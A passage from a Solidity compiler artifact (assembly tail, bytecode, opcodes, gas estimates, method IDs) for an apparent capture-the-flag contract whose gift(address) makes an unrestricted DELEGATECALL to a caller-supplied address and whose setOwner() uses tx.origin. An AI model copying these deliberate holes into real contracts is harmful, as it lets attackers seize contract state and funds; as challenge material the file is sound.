\"shoot/3/delegatecall调用出错/1.sol\":2267:2272  owner */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2255:2272  msg.sender==owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2255:2265  msg.sender */\n      caller\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2255:2272  msg.sender==owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2252:2309  if(msg.sender==owner){\r... */\n      iszero\n      tag_54\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2295:2297  50 */\n      0x32\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2288:2293  score */\n      0x2\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2288:2297  score+=50 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2252:2309  if(msg.sender==owner){\r... */\n    tag_54:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2334:2340  0x2022 */\n      0x2022\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2322:2330  password */\n      sload(0x1)\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2322:2340  password == 0x2022 */\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2319:2377  if(password == 0x2022){\r... */\n      iszero\n      tag_55\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2363:2365  50 */\n      0x32\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2356:2361  score */\n      0x2\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2356:2365  score+=50 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2319:2377  if(password == 0x2022){\r... */\n    tag_55:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820cb11c4d36ce1bd8456b2a9ca0309f237dbfbb627bd20b6cee64bdc23f4723c2e0029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506107f4806100606000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806340caae0614610085578063522e11771461009c57806368e9a07e146100a6578063ade58ccb146100d3578063cbfc4bce14610143578063efedc66914610186578063fa391c64146101b1575b005b34801561009157600080fd5b5061009a6101c8565b005b6100a4610244565b005b3480156100b257600080fd5b506100d160048036038101908080359060200190929190505050610294565b005b3480156100df57600080fd5b506100e86102d5565b60405180837bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191681526020018281526020019250505060405180910390f35b34801561014f57600080fd5b50610184600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610322565b005b34801561019257600080fd5b5061019b610733565b6040518082815260200191505060405180910390f35b3480156101bd57600080fd5b506101c6610739565b005b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561020257600080fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60003073ffffffffffffffffffffffffffffffffffffffff163111151561026a57600080fd5b3073ffffffffffffffffffffffffffffffffffffffff16313411156102925760646002819055505b565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102ce57600080fd5b8060015550565b60008060243d1415156102e757600080fd5b60405160246000823e7fffffffff00000000000000000000000000000000000000000000000000000000815116925080600401519150509091565b60008060008015158473ffffffffffffffffffffffffffffffffffffffff1663cbfc4bce7c010000000000000000000000000000000000000000000000000000000002604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405180828051906020019080838360005b838110156103f55780820151818401526020810190506103da565b50505050905090810190601f1680156104225780820380516001836020036101000a031916815260200191505b50915050600060405180830381855af491505015151415156104ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260108152602001807f756e7361666520657865637574696f6e0000000000000000000000000000000081525060200191505060405180910390fd5b6104b46102d5565b925092503073ffffffffffffffffffffffffffffffffffffffff16837c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303816000875af19250505090508015156105a7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f676966742063616c6c206572726f72000000000000000000000000000000000081525060200191505060405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff166368e9a07e7c0100000000000000000000000000000000000000000000000000000000028360405160200180837bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191681526004018281526020019250505060405160208183030381529060405260405180828051906020019080838360005b83811015610674578082015181840152602081019050610659565b50505050905090810190601f1680156106a15780820380516001836020036101000a031916815260200191505b509150506000604051808303816000865af1915050905080151561072d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f63616c6c206661696c656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b50505050565b60025481565b60006002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156107a85760326002600082825401925050819055505b61202260015414156107c65760326002600082825401925050819055505b5600a165627a7a72305820cb11c4d36ce1bd8456b2a9ca0309f237dbfbb627bd20b6cee64bdc23f4723c2e0029",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x7F4 DUP1 PUSH2 0x60 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x40CAAE06 EQ PUSH2 0x85 JUMPI DUP1 PUSH4 0x522E1177 EQ PUSH2 0x9C JUMPI DUP1 PUSH4 0x68E9A07E EQ PUSH2 0xA6 JUMPI DUP1 PUSH4 0xADE58CCB EQ PUSH2 0xD3 JUMPI DUP1 PUSH4 0xCBFC4BCE EQ PUSH2 0x143 JUMPI DUP1 PUSH4 0xEFEDC669 EQ PUSH2 0x186 JUMPI DUP1 PUSH4 0xFA391C64 EQ PUSH2 0x1B1 JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x91 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9A PUSH2 0x1C8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA4 PUSH2 0x244 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x294 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE8 PUSH2 0x2D5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x184 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x322 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x192 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19B PUSH2 0x733 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C6 PUSH2 0x739 JUMP JUMPDEST STOP JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x202 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO ISZERO PUSH2 0x26A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE CALLVALUE GT ISZERO PUSH2 0x292 JUMPI PUSH1 0x64 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST JUMP JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x2CE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x24 RETURNDATASIZE EQ ISZERO ISZERO PUSH2 0x2E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x24 PUSH1 0x0 DUP3 RETURNDATACOPY PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP2 MLOAD AND SWAP3 POP DUP1 PUSH1 0x4 ADD MLOAD SWAP2 POP POP SWAP1 SWAP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 ISZERO ISZERO DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCBFC4BCE PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x3F5 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x3DA JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x422 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP ISZERO ISZERO EQ ISZERO ISZERO PUSH2 0x4AC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x10 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x756E7361666520657865637574696F6E00000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x4B4 PUSH2 0x2D5 JUMP JUMPDEST SWAP3 POP SWAP3 POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x5A7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x676966742063616C6C206572726F720000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x68E9A07E PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x4 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x674 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x659 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x6A1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x72D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xB DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x63616C6C206661696C6564000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x7A8 JUMPI PUSH1 0x32 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH2 0x2022 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x7C6 JUMPI PUSH1 0x32 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xcb GT 0xc4 0xd3 PUSH13 0xE1BD8456B2A9CA0309F237DBFB 0xb6 0x27 0xbd KECCAK256 0xb6 0xce 0xe6 0x4b 0xdc 0x23 DELEGATECALL PUSH19 0x3C2E0029000000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "407200",
						"executionCost": "20709",
						"totalCost": "427909"
					},
					"external": {
						"": "217",
						"complete()": "21009",
						"getReturns()": "infinite",
						"gift(address)": "infinite",
						"isCompleted()": "31244",
						"score()": "504",
						"setOwner()": "20438",
						"setPassword(uint256)": "20280"
					}
				},
				"methodIdentifiers": {
					"complete()": "522e1177",
					"getReturns()": "ade58ccb",
					"gift(address)": "cbfc4bce",
					"isCompleted()": "fa391c64",
					"score()": "efedc669",
					"setOwner()": "40caae06",
					"setPassword(uint256)": "68e9a07e"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}